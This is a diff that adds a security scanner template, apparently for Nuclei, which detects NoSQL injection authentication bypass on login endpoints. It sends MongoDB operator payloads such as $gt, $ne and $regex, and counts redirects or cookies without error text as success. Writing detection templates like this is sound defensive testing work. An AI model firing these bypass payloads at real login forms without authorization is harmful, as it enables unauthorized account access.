@@ -1,0 +1,70 @@
+id: nosqli-auth-bypass
+
+info:
+  name: NoSQL Injection - Authentication Bypass
+  author: erebos
+  severity: critical
+  description: |
+    Detects NoSQL injection authentication bypass by injecting MongoDB operators
+    ($gt, $ne, $regex) into login forms. Successful bypass is detected by observing
+    redirects to authenticated areas or absence of login error messages.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
+    - https://nullsweep.com/nosql-injection-cheatsheet/
+  metadata:
+    max-request: 4
+  tags: nosql,mongodb,injection,auth,bypass,dast,vuln
+  classification:
+    cwe-id: CWE-943
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "POST"'
+          - 'contains(path, "login") || contains(path, "auth") || contains(path, "signin")'
+        condition: or
+
+    payloads:
+      nosql_bypass:
+        - "{\"$gt\":\"\"}"
+        - "{\"$ne\":\"invalid\"}"
+        - "{\"$regex\":\".*\"}"
+        - "[$ne]=x"
+
+    fuzzing:
+      - part: request
+        type: replace
+        mode: single
+        fuzz:
+          - "{{nosql_bypass}}"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 301
+          - 302
+          - 303
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "location:"
+          - "set-cookie:"
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - "login"
+          - "invalid"
+          - "incorrect"
+          - "failed"
+          - "error"
+          - "unauthorized"
+        negative: true
+        condition: and
